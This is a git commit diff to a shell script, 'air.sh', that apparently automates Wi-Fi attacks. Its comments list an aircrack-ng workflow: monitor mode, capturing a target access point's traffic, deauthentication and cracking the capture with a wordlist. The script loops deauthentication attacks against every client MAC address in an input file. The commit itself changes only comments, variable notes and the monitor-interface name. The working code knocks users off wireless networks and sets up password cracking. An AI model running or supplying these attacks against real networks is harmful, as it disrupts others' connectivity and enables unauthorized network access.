33a871417f3f1e0c2812e48126d750fd19e7e4e5
Phu Bar <phubar@isotomic.com>
2017-01-22 09:21:43 -0800

    Update air.sh

--- Basic/air.sh
+++ Basic/air.sh
@@ -3,22 +3,22 @@
 # airmon-ng start wlanX
 # airodump-ng -i wlanXmon
 # airodump-ng -c <channel - no hopping> --bssid <mac of ap> --write <file> wlanXmon 
-# aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon --ignore-negative-one
+# aireplay-ng --deauth 5 -a <mac of ap> -c <client optional> wlanXmon
 # aircrack-ng <file.cap> -w <wordlist>
 
 # usage ./air.sh <input file>
 # input file list of MAC addresses
-IFC="wlanX" # mon interface
-AP="00:00:00:00:00:00" # target AP MAC
-CHANNEL="X" #AP CHannel
+
+IFC="wlanX"
+AP="00:00:00:00:00:00"
+CHANNEL="X"
 
 MON=`cat /sys/class/net/$IFC/operstate`
 if [ "$MON" != "unknown" ] ; then
-        echo "enabling mon"
+        echo "enabling mon interface"
         airmon-ng start $IFC $CHANNEL
 fi
 
 while IFS='' read -r line || [[ -n "$line" ]]; do
-        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a $AP -c $line $IFC
+        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a $AP -c $line $IFC"mon"
 done < "$1"
-
